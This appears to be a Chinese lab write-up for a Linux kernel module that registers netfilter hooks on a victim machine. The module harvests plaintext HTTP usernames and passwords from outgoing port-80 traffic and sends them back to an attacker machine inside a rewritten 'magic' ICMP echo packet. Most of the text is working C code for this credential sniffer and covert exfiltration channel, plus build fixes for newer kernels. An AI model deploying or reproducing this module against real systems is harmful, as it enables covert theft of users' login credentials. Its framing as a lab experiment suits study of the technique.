# 用netfilter获取http明文用户名和密码
### 实验环境：
ubuntu 18.04 kernel 4.15  

### target端的操作

源文件：nf_http.c  Makefile  
#### 1. 内核模块的操作

* 头文件 linux/kernel.h  linux/module.h
* 初始化模块（netfilter，见下）
* 编译得到.ko文件   makefile
* 加载模块 sudo ismod nf_http.ko 
* 打印10行信息 dmesg | tail  
*  展示内核模块 ls mod
*  卸载模块 sudo rmmod nf_http (注意不用.ko)

#### 2. 初始化netfilter

* 头文件 linux/netfilter.h  linux/netfilter_ipv4.h
* 钩子点结构体

    ```c
    struct nf_hook_ops {
                      struct list_head list;
                      /* 此下的值由程序员填充 */
                      nf_hookfn *hook;
                      int pf;
                      int hooknum;
                      /* Hook以升序的优先级排序 */
                      int priority;
              };
     ```
  

* PRE_ROUTING 钩子：watch_in() 检查发出去的包
* POST_ROUTING钩子：watch_out() 检查收到的包   

 ```c  
    static unsigned int watch_out(void *priv, struct sk_buff *skb,
                                            const struct nf_hook_state *state)
    {
        struct sk_buff *sb = skb;
        struct tcphdr *tcp;
        printk("post routing");
        /* Make sure this is a TCP packet first */
        if (ip_hdr(sb)->protocol != IPPROTO_TCP)
            return NF_ACCEPT; /* Nope, not TCP */
        tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
        /* Now check to see if it's an HTTP packet */
        if (tcp->dest != htons(80))
            return NF_ACCEPT; /* Nope, not FTP */
        //Parse the HTTP packet for relevant information if we don't already have a username and password pair. 
        if (!have_pair)
        {
            printk("check http");
            check_http(sb);
        }

        return NF_ACCEPT;
    }

 ```
  
 ```c    
    struct nf_hook_ops pre_hook;  
    struct nf_hook_ops post_hook;  
    
    int init_module()
    {
        pre_hook.hook = watch_in;
        pre_hook.pf = PF_INET;
        pre_hook.priority = NF_IP_PRI_FIRST;
        pre_hook.hooknum = NF_INET_PRE_ROUTING;

        post_hook.hook = watch_out;
        post_hook.pf = PF_INET;
        post_hook.priority = NF_IP_PRI_FIRST;
        post_hook.hooknum = NF_INET_POST_ROUTING;

        nf_register_net_hook(&init_net,&pre_hook);
        nf_register_net_hook(&init_net,&post_hook);
        return 0;
    }
 ```
  
 #### 3. 在target内核用netfilter过滤发出去http包，发现port=80的http包，就调用check_http（）
 
 ```c

    static unsigned int watch_out(void *priv, struct sk_buff *skb,
    const struct nf_hook_state *state)
    {
        struct sk_buff *sb = skb;
        struct tcphdr *tcp;
        printk("post routing");
        /* Make sure this is a TCP packet first */
        if (ip_hdr(sb)->protocol != IPPROTO_TCP)
            return NF_ACCEPT; /* Nope, not TCP */
        tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
        /* Now check to see if it's an HTTP packet */
        if (tcp->dest != htons(80))
            return NF_ACCEPT; /* Nope, not FTP */
        /* Parse the HTTP packet for relevant information if we don't already
        * have a username and password pair. */
        if (!have_pair)
        {
            printk("check http");
            check_http(sb);
        }
        /* We are finished with the packet, let it go on its way */
        return NF_ACCEPT;
    }
```

#### 4. 解析http 

使用字符串匹配，找到代表username、password的字段，通过网页源码或抓包确定变量名，cookie字段中也有uid和password，但没有&   
```c
    static void check_http(struct sk_buff *skb)
    {
        struct tcphdr *tcp;
        char *data;
        char *name;
        char *passwd;
        char *_and;
        char *check_connection;
        int len,i;
        tcp = tcp_hdr(skb);
        data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));

        if (strstr(data,"Connection") != NULL && strstr(data, "&uid") != NULL && strstr(data, "&password") != NULL) 
        {
            check_connection = strstr(data,"Connection");
            printk("find connection uid password");

            name = strstr(check_connection,"&uid=");
            name += 5;
            _and = strstr(name,"&");
            len = _and - name;
            if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
                return;
            memset(username, 0x00, len + 2);
            for (i = 0; i < len; ++i)
            {
                *(username + i) = name[i];
            }
            *(username + len) = '\0';

            passwd = strstr(name,"&password=");
            passwd += 10;
            _and = strstr(passwd,"&");
            len = _and - passwd;
            if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
                return;
            memset(password, 0x00, len + 2);
            for (i = 0; i < len; ++i)
            {
                *(password + i) = passwd[i];
            }
                *(password + len) = '\0';
            } else {
                printk("it`s not a http post");
            return;
        }

        if (!target_ip)
            target_ip = ip_hdr(skb)->daddr;
        if (!target_port)
            target_port = tcp->source;
        if (username && password)
            have_pair++; 
        if (have_pair)
            printk("Have a uid&pwd pair! U: %s P: %s\n", username, password);
    }

 ```
 
 #### 4. target中使用netfilter过滤收到的包，当发现特定的icmp包后，直接修改此数据报，mac、ip、username、pwd，并发送回hack。  
 
 ```c

    static unsigned int watch_in(void *priv, struct sk_buff *skb,
    const struct nf_hook_state *state)
    {
        struct sk_buff *sb = skb;
        struct icmphdr *icmp;
        char *cp_data;    /* Where we copy data to in reply */
        unsigned int taddr;   /* Temporary IP holder */
        printk("pre routing");
        /* Do we even have a username/password pair to report yet? */
        if (!have_pair)
            return NF_ACCEPT;
        /* Is this an ICMP packet? */
        if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;
        icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4); //+20 ip头
        /* Is it the MAGIC packet? */
        if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
        || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
        printk("it`s not a MAGIC packet");
        return NF_ACCEPT;
        }
        /* 直接修改 接收 的buffer
        * Okay, matches our checks for "Magicness", now we fiddle with
        * the sk_buff to insert the IP address, and username/password pair,
        * swap IP source and destination addresses and ethernet addresses
        * if necessary and then transmit the packet from here and tell
        * Netfilter we stole it. Phew... */
        printk("get the MAGIC packet");
        /*交换src dst 的ip*/
        taddr = ip_hdr(sb)->saddr;
        ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
        ip_hdr(sb)->daddr = taddr;
        sb->pkt_type = PACKET_OUTGOING;
        //设置mac
        switch (sb->dev->type) {
        case ARPHRD_PPP:     /* Ntcho iddling needs doing */
        break;
        case ARPHRD_LOOPBACK:
        case ARPHRD_ETHER:
          {
           unsigned char t_hwaddr[ETH_ALEN];

           /*将源MAC设置为目的MAC*/
           sb->data = (unsigned char *)eth_hdr(sb);
           sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
           memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
           memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
             ETH_ALEN);
           memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
          break;
          }
        };
        /* Now copy the 自身的IP address, then Username, then password into packet */
        /*(char *)icmp 是为了保证指针移动的标准是char* ，64位OS中是8字节*/
        cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
        memcpy(cp_data, &target_ip, 4);
        if (username)
        //memcpy(cp_data + 4, username, 16);
            memcpy(cp_data + 4, username, 16);
        if (password)
            memcpy(cp_data + 20, password, 16);
        /*
        * This is where things will die if they are going to.
        * Fingers crossed...
        * 发送 buffer
        * A negative errno code is returned on a failure.
        * A success does not guarantee the frame will be transmitted
        * as it may be dropped due to congestion or traffic shaping.*/
        dev_queue_xmit(sb);
        printk("the pair has been send to target");
        /* Now free the saved username and password and reset have_pair */
        kfree(username);
        kfree(password);
        username = password = NULL;
        have_pair = 0;
        target_port = target_ip = 0;
        printk("clear the pair\n");
        /* 不能return NF_DROP，因为dev_queue_xmit将释放缓冲区，
        * Netfilter将尝试对NF_DROPped数据包执行相同操作，导致内核错误。*/
        return NF_STOLEN;
    }


 ```
    
 #### 5. 清理netfilter
 ```c
    void cleanup_module()
    {
        //struct net *net=NULL;
        nf_unregister_net_hook(&init_net,&post_hook);
        nf_unregister_net_hook(&init_net,&pre_hook);
        if (password)
        kfree(password);
        if (username)
        kfree(username);
        return;
    }
    
 ```
 
 ### hack端的操作 
 
源文件：getData.c    
* 向target发送特殊的icmp包  

    raw socket 编程, 发送icmp数据包 ，保证足够的长度盛放target返回的数据。 

    ip头  20字节  icmp头 8字节  icmp数据 4+16+16=36字节   

* 接收和打印target发回的数据


### 遇到的问题

1. make error 1：assignment from incompatible pointer type [-Werror=incompatible-pointer-types]  
    pre_hook.hook    = watch_in;


    自从kernel4.13开始 hook函数的原型就是  
    int sample_nf_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)；  
    
    而不是
    ```c
    static unsigned int sample(unsigned int hooknum, struct sk_buff * skb,
    const struct net_device *in, const struct net_device *out,  int (*okfn) (struct sk_buff *))  
    ```

2. make error2 ：
    nf_register_hook(&pre_hook);   
     ^~~~~~~~~~~~~~~~   
     nf_register_net_hook   

    nf_register_hook在新版内核里面换成了 nf_register_net_hook(struct net *net, const struct nf_hook_ops *ops)；   
    可以这样
    ```c
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0) 
    nf_register_net_hook(&init_net, &reg)  //&init_net 可直接使用
    #else 
    nf_register_hook(&reg) 
    #endif
    ```


### 参考
[https://blog.csdn.net/bw_yyziq/article/details/78290715](https://blog.csdn.net/bw_yyziq/article/details/78290715)  
[https://zhuanlan.zhihu.com/p/61164326  ](https://zhuanlan.zhihu.com/p/61164326  )


